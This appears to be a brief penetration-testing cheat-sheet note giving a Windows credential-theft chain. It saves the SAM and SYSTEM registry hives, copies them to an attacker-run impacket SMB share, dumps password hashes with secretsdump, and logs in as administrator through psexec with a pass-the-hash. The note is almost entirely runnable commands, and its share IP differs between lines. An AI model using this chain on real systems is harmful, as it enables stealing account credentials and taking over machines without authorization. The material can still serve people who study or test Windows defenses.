
<font color=yellow>(only for non-AD servers)</font> ??

on windows machine:
`reg save hklm\system .\system.hive`
`reg save hklm\sam .\sam.hive`

on attacker machine:
`sudo impacket-smbserver -smb2support -username user -password password myshare ../dirname`

on windows machine:
`net use \\10.10.15.2\myshare /USER:user password`
`copy sam.hive \\10.18.21.236\myshare`
`copy system.hive \\10.18.21.236\myshare`

on attacker machine:
`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
`impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.62.147`
